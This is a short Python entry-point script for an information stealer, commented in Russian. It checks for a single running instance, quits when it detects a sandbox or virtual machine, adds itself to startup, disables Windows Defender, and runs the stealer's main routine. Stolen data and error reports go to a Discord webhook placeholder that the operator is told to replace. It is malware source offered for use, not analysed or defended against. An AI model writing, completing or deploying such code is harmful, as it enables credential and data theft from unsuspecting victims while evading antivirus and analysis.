import os
import sys
import json
from client import main, collect_data, send_zip
from utils import block_sites, add_to_startup, is_sandboxed, disable_defender, create_mutex

# Webhook URL (замените на свой при использовании)
WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE"

def run():
    # Проверка на единственный экземпляр
    if not create_mutex():
        sys.exit(0)
    
    # Anti-VM проверка
    if is_sandboxed():
        sys.exit(0)
    
    # Добавление в автозапуск
    add_to_startup()
    
    # Отключение Defender (требует прав администратора)
    disable_defender()
    
    # Запуск основного функционала стилера
    main(WEBHOOK_URL)

if __name__ == "__main__":
    try:
        run()
    except Exception as e:
        # В случае ошибки пытаемся отправить отчет об ошибке
        try:
            import requests
            error_data = {"error": str(e)}
            requests.post(WEBHOOK_URL, json={"content": f"Error: `{str(e)}`"})
        except:
            pass 